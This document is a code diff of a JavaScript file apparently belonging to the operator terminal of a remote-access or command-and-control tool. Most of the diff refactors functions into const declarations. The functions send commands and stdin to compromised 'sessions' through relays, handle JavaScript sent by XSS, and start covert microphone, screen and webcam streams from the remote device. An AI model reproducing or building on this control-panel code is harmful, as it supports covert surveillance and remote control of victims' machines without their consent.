@@ -1,8 +1,11 @@
 
 /* Set functions for terminal.html */
 
+	// Auto fetch
+	let autoFetcher = async () => {}
+
 	// Generate random string
-	randomString = async (min, max) => {
+	const randomString = async (min, max) => {
 		let length = ( min + ( Math.random() * (max - min) ) )
 		let chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
 		let buffer = ""
@@ -16,12 +19,12 @@
 	}
 
 	// Randomize seconds
-	randTime = async (min, max) => {
+	const randTime = async (min, max) => {
 		return ( min + ( Math.random() * (max - min) ) )
 	}
 
 	// Print to terminal
-	print = async html => {
+	const print = async html => {
 		let now = new Date()
 
 		let timestamped = document.createElement("stamp")
@@ -40,12 +43,12 @@
 	}
 
 	// Return readable timestamp
-	timestamp = async () => {
+	const timestamp = async () => {
 		return new Date().toLocaleString().toUpperCase().replace(",", " ").replace(/\//g, "-")
 	}
 
 	// Print commands
-	printCommands = async () => {
+	const printCommands = async () => {
 		let res = await sendRequest("GET", "/help.html", "")
 
 		if (res.status == 200) {
@@ -54,7 +57,7 @@
 	}
 
 	// Get current User-Agent of sewers (used in requests sent to relays)
-	getsewersUserAgent = async () => {
+	const getsewersUserAgent = async () => {
 		return new Promise(resolve=>{
 			sendRequest("GET", "/useragent", "").then(res=>{
 				if (res.status == 200) {
@@ -64,7 +67,7 @@
 		})
 	}
 
-	printSessionInfo = async () => {
+	const printSessionInfo = async () => {
 		let icon = ""
 
 		if ( session_config["os"].indexOf("Android" || "android") >= 0 ) {
@@ -93,7 +96,7 @@
 	}
 
 	// Return StdIn to sewers
-	stdIn = async data => {
+	const stdIn = async data => {
 		let params = new String(
 			"?body=" + data + 
 			"&session_id=" + session_id + 
@@ -106,7 +109,7 @@
 	}
 
 	// Change fetch rate
-	changeFetchRate = async (min, max) => {
+	const changeFetchRate = async (min, max) => {
 		$.ajax({
 			method: 'post',
 			url: '../../post',
@@ -120,7 +123,7 @@
 	}
 
 	// Fetch new packets from interpreter
-	fetchPackets = async () => {
+	const fetchPackets = async () => {
 		await resetLoadLine()
 		moveLoadLine()
 
@@ -182,11 +185,8 @@
 		}
 	}
 
-	// Auto fetch
-	autoFetcher = async () => {}
-
 	// Start auto fetcher
-	startAutoFetching = async (min, max) => {
+	const startAutoFetching = async (min, max) => {
 		if (auto_fetching) {
 			print("<span>Waiting for auto fetcher...<br></span>")
 
@@ -221,7 +221,7 @@
 	}
 
 	// Stop auto fetcher
-	stopAutoFetching = async (min, max) => {
+	const stopAutoFetching = async (min, max) => {
 		auto_fetching = false
 		fetch_delay = 1000
 
@@ -233,7 +233,7 @@
 	}
 
 	// Get session config
-	getSessionConfig = async (relay, session) => {
+	const getSessionConfig = async (relay, session) => {
 		let res = await sendRequest("GET", "/session/" + relay + "/" + session, "")
 
 		if (res.status == 200) {
@@ -244,7 +244,7 @@
 	}
 
 	// Get relay config
-	getRelayConfig = async relay => {
+	const getRelayConfig = async relay => {
 		let res = await sendRequest("GET", "/config/" + relay, "")
 
 		if (res.status == 200) {
@@ -255,7 +255,7 @@
 	}
 
 	// Move loadline
-	moveLoadLine = async () => {
+	const moveLoadLine = async () => {
 		new_width = parseInt( 720 / (fetch_delay / 1000) )
 		new_width < 5 ? new_width = 5 : ""
 
@@ -268,7 +268,7 @@
 	}
 
 	// Reset loadline
-	resetLoadLine = async () => {
+	const resetLoadLine = async () => {
 		new_width = parseInt( 720 / (fetch_delay / 1000) )
 		new_width < 5 ? new_width = 5 : ""
 
@@ -282,23 +282,28 @@
 	}
 
 	// Scroll to bottom
-	scrollToBottom = async () => {
+	const scrollToBottom = async () => {
 		scrollBox.scrollTop = terminal.getBoundingClientRect().height
 	}
 
 	// Set clear breaks for clear function
-	resetClearBreaks = async () => {
+	const resetClearBreaks = async () => {
 		clearBreaks = parseInt( ( document.body.getBoundingClientRect().height - 84 ) / 12 )
 	}
 
+	// Shrink input field as scrollbox increases in size
+	const shrinkInputField = async () => {
+		form.style.height = "calc(100vh - " + scrollBox.getBoundingClientRect().height + "px)"
+	}
+
 	// Clear function
-	clear = async () => {
+	const clear = async () => {
 		linebreaks = "<br>".repeat(clearBreaks)
 		print(linebreaks)
 	}
 
 	// Append new stream to menu
-	addStream = async (streamID, streamType) => {
+	const addStream = async (streamID, streamType) => {
 		if (streamType == "STREAMMIC") {
 			document.querySelector("html body div.menu").append("<div class='item left' title='Stream ID: " + streamID + "' onclick='window.open(\"" + location.protocol + "//" + location.hostname + (location.port ? ":" + location.port : "") + "/stream?mic&" + streamID + "&" + streamFile + ".mp4\", \"" + streamFile + ".wav\", \"width=180,height=230,status=no,menubar=no,toolbar=no,titlebar=no,location=no\")'><div class='icon streammic'><div class='icon rec blinking'></div></div></div>")
 		} else if (streamType == "STREAMMON") {
@@ -309,7 +314,7 @@
 	}
 
 	// Start new monitor stream
-	streamMon = async (bitrate, resolution) => {
+	const streamMon = async (bitrate, resolution) => {
 		let res = await sendRequest("POST", "/", "data=STREAMMON " + bitrate + " " + resolution + "&session_id=" + session_id)
 
 		if (res.status == 200) {
@@ -333,7 +338,7 @@
 	}
 
 	// Start new microphone stream
-	streamMic = async bitrate => {
+	const streamMic = async bitrate => {
 		let res = await sendRequest("POST", "/", "data=STREAMMIC " + bitrate + "&session_id=" + session_id)
 
 		if (res.status == 200) {
@@ -357,7 +362,7 @@
 	}
 
 	// Start new webcam stream
-	streamCam = async (bitrate, resolution) => {
+	const streamCam = async (bitrate, resolution) => {
 		print(request_tag + "<span title='" + await timestamp() + "'>Streaming webcam...</span>")
 
 		let res = await sendRequest("POST", "/", "data=STREAMCAM&session_id=" + session_id)
@@ -383,17 +388,17 @@
 	}
 
 	// Escape HTML
-	escapeHTML = async data => {
+	const escapeHTML = async data => {
 		return data.replace(/\&/g, "&amp;").replace(/\</g,"&lt;").replace(/\>/g,"&gt;").replace(/\"/g, "&quot;").replace(/\'/g,"&#39;").replace(/\//g, "&#x2F;").replace(/ /g, "&nbsp;").replace(/\t/g, "&emsp;").replace(/\n/g, "<br>")
 	}
 
 	// Strip strings (the Ruby way)
-	strip = async data => {
+	const strip = async data => {
 		return data.replace(/^\s*/, "").replace(/\s*$/, "")
 	}
 
 	// Input handler
-	onCommand = async () => {
+	const onCommand = async () => {
 		let cmd = textarea.value
 
 		textarea.value = ""
@@ -477,7 +482,7 @@
 	}
 
 	// XSS input handler
-	onXSSCommand = async () => {
+	const onXSSCommand = async () => {
 		let cmd = jsfield.value
 		let esc_cmd = escapeHTML(cmd)
 
